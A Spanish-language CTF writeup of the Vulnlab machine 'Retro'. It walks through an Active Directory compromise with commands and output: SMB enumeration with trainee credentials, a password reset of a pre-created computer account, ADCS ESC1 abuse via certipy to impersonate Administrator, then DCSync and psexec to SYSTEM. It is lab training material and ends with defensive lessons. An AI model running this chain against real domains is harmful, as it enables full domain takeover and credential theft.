---
title: "Retro"
description: "Writeup de Retro - Vulnlab - Dificultad: Medium. Credenciales trainee:trainee vía SMB → cuenta de computadora pre-creada BANKING$ → ESC1 ADCS con SAN alternativo → DCSync como Administrator."
sidebar:
  badge:
    text: Medium
    variant: caution
tags:
  - vulnlab
  - windows
  - medium
  - active-directory
  - smb-enum
  - adcs
  - esc1
  - pre-created-computer-account
  - certipy
  - dcsync
---

# 🖥️ Retro

> 📅 Fecha: 2026-05-15
> 🎯 Plataforma: Vulnlab
> ⚙️ SO: Windows Server 2022 (Build 20348)
> 🎚️ Dificultad: Medium
> 🏆 Puntos: 853
> ⏱️ Tiempo invertido: 3h 45m
> 🌐 IP: `10.129.34.121`
> 🏢 Dominio: `retro.vl`
> 👤 Autor: warrior866

---

## 📑 Tabla de Contenidos
- [Resumen Ejecutivo](#-resumen-ejecutivo)
- [Reconocimiento](#-reconocimiento)
- [Enumeración SMB: trainee:trainee](#-enumeración-smb-trainteetrainee)
- [Cuenta pre-creada BANKING$](#-cuenta-pre-creada-banking)
- [ESC1: Certificate Template con EnrolleeSuppliesSubject](#-esc1-certificate-template-con-enrolleesuppliessubject)
- [DCSync → Administrator](#-dcsync--administrator)
- [Flags](#-flags)
- [Cadena de Ataque](#-cadena-de-ataque)
- [Lecciones Aprendidas](#-lecciones-aprendidas)
- [Referencias](#-referencias)

---

## 📝 Resumen Ejecutivo

Retro es un Domain Controller Vulnlab (`retro.vl`) con ADCS activo. El share `NETLOGON` es accesible con credenciales `trainee:trainee` — dentro se encuentra un `notes.txt` que confirma la existencia de una cuenta de computadora pre-creada `BANKING$`. Las cuentas pre-creadas tienen como contraseña por defecto el nombre de la cuenta en minúsculas, lo que permite reset de la contraseña con `impacket-changepasswd`. Con `BANKING$` autenticado, `certipy find` identifica **ESC1** en el template `RetroClients` (flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`). Se solicita un certificado con UPN de `Administrator@retro.vl` y se usa para autenticarse vía PKINIT, obteniendo el hash NT del Administrador → DCSync completo.

| Campo | Valor |
|-------|-------|
| Puntos débiles | Credenciales triviales en share SMB, cuenta pre-creada con password predecible, ESC1 (EnrolleeSuppliesSubject) en template enrollable por computadoras |
| Plataforma | Vulnlab (no HTB) |
| Herramientas | `nmap`, `nxc`, `smbclient`, `impacket-changepasswd`, `certipy`, `impacket-secretsdump` |
| Tiempo total | ~3h 45m |

---

## 🔍 Reconocimiento

```bash
nmap -p- -sS -sV -sC -O -T4 --min-rate=1000 --open -Pn 10.129.34.121
```

```text
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap          (Domain: retro.vl)
443/tcp   open  https         Microsoft IIS 10.0
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
3268/tcp  open  ldap
3389/tcp  open  ms-wbt-server (RDP)
Service Info: Host: DC; OS: Windows Server 2022
```

Puerto 443 → ADCS Web Enrollment activo. Dominio: `retro.vl`.

```bash
echo "10.129.34.121 retro.vl dc.retro.vl" | sudo tee -a /etc/hosts
```

---

## 🗂️ Enumeración SMB: trainee:trainee

```bash
nxc smb 10.129.34.121 -u 'trainee' -p 'trainee' --shares
```

```text
[+] retro.vl\trainee:trainee
Share        Permissions
-----------  -----------
NETLOGON     READ
SYSVOL       READ
Trainees     READ
```

```bash
smbclient //10.129.34.121/Trainees -U 'retro.vl\trainee%trainee' -c 'ls'
```

```text
  Important.txt  N  290  Mon Jul 23 21:12:28 2023
```

```bash
smbclient //10.129.34.121/Trainees -U 'retro.vl\trainee%trainee' -c 'get Important.txt'
cat Important.txt
```

```text
Dear Trainees,

I know that some of you have been setting up your own environments to practice working with 
Active Directory. Below are the details for the account that has been set up for you. 
The pre-created computer accounts are set up with the company name as their password.

BANKING$

Once you have changed the password, please keep it secure and don't share it with others.

Regards,
IT Department
```

La cuenta `BANKING$` es una **cuenta de computadora pre-creada** — su contraseña por defecto según el texto es el nombre de la empresa, pero el mecanismo de pre-creación de AD establece la contraseña como el sAMAccountName sin el `$` en minúsculas: `banking`.

---

## 💻 Cuenta pre-creada BANKING$

Verificar la cuenta:

```bash
nxc smb 10.129.34.121 -u 'BANKING$' -p 'banking'
```

```text
[-] retro.vl\BANKING$:banking  STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
```

El error `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` confirma que la cuenta existe pero aún no se ha "joined" al dominio — está pre-creada. Se puede cambiar la contraseña con `kpasswd` o `impacket-changepasswd`:

```bash
impacket-changepasswd 'retro.vl/BANKING$:banking@10.129.34.121' \
  -newpass 'Hacker123!' -no-pass
```

```text
[*] Changing the password of retro.vl\BANKING$
[*] Connecting to DCE/RPC as retro.vl\BANKING$
[*] Password was changed successfully.
```

Verificar autenticación con la nueva contraseña:

```bash
nxc smb 10.129.34.121 -u 'BANKING$' -p 'Hacker123!'
```

```text
[+] retro.vl\BANKING$:Hacker123!
```

---

## 📜 ESC1: Certificate Template con EnrolleeSuppliesSubject

```bash
certipy find -u 'BANKING$@retro.vl' -p 'Hacker123!' -dc-ip 10.129.34.121 -vulnerable -stdout
```

```text
Certificate Templates
  0
    Template Name     : RetroClients
    Display Name      : Retro Clients
    ...
    Enrollment Rights : retro.vl\Domain Computers
    msPKI-Certificate-Name-Flag : ENROLLEE_SUPPLIES_SUBJECT
    ...
    [!] Vulnerabilities
      ESC1 : Template allows requestor to supply a SAN (Subject Alternative Name)
```

`RetroClients` tiene `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` y es enrollable por `Domain Computers` — `BANKING$` es una cuenta de dominio, por lo que puede solicitar certificados de este template.

Solicitar certificado como `Administrator@retro.vl`:

```bash
certipy req -u 'BANKING$@retro.vl' -p 'Hacker123!' \
  -dc-ip 10.129.34.121 -ca 'retro-DC-CA' \
  -template 'RetroClients' -upn 'Administrator@retro.vl'
```

```text
[*] Requesting certificate via RPC
[+] Trying to get certificate...
[+] Got certificate with UPN 'Administrator@retro.vl'
[+] Certificate object SID is 'S-1-5-21-...-500'
[+] Saved certificate and private key to 'administrator.pfx'
```

---

## 💀 DCSync → Administrator

Autenticación con el certificado → NT hash del Administrador:

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.129.34.121 -domain retro.vl
```

```text
[*] Using principal: administrator@retro.vl
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[+] Got hash for 'administrator@retro.vl': aad3b435...:252fac7a...
```

DCSync completo:

```bash
impacket-secretsdump -hashes ':252fac7a...' retro.vl/Administrator@10.129.34.121
```

Acceso como SYSTEM:

```bash
impacket-psexec -hashes ':252fac7a...' Administrator@10.129.34.121
```

```text
C:\Windows\system32> whoami
nt authority\system
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
[root flag]
```

```bash
# user flag (en escritorio de trainee u otro usuario del dominio)
impacket-smbclient -hashes ':252fac7a...' Administrator@10.129.34.121
# Navegar a C:\Users\trainee\Desktop\user.txt
```

---

## 🏁 Flags

| Flag | Valor |
|------|-------|
| user.txt | `[user flag]` |
| root.txt | `[root flag]` |

---

## 🕸️ Cadena de Ataque

```text
1. nxc → trainee:trainee → share Trainees
        ↓
2. Important.txt → cuenta pre-creada BANKING$ con password predecible
        ↓
3. impacket-changepasswd → BANKING$:Hacker123!
        ↓
4. certipy find → ESC1 en template RetroClients (enrollable por Domain Computers)
        ↓
5. certipy req → UPN=Administrator@retro.vl → administrator.pfx
        ↓
6. certipy auth → NT hash 252fac7a...
        ↓
7. impacket-psexec → NT AUTHORITY\SYSTEM → root.txt
```

---

## 🎓 Lecciones Aprendidas

- **Cuentas pre-creadas en AD**: cuando se usa la opción "Assign this computer account as a pre-Windows 2000 computer" o se pre-crean sin Join, la contraseña inicial es el nombre en minúsculas. Siempre resetear después del join y no dejarlas acumuladas.
- **ESC1 (EnrolleeSuppliesSubject)**: el flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` permite que el solicitante elija su propio SAN (UPN o DNS). En combinación con templates enrollables por cuentas de dominio, permite impersonar cualquier usuario del AD.
- **Credenciales hardcodeadas en shares de capacitación**: `trainee:trainee` y notas descriptivas sobre cuentas de prueba son vectores reales en entornos de formación que coexisten con producción.
- **Certipy**: herramienta indispensable para auditar ADCS. `certipy find -vulnerable` muestra solo los templates con misconfiguraciones conocidas.

---

## 📚 Referencias

- [ESC1 — Certipy](https://github.com/ly4k/Certipy)
- [Certified Pre-Owned — SpecterOps](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)
- [MITRE ATT&CK — T1649 Steal or Forge Authentication Certificates](https://attack.mitre.org/techniques/T1649/)
- [Pre-created Computer Accounts](https://adsecurity.org/?p=1758)
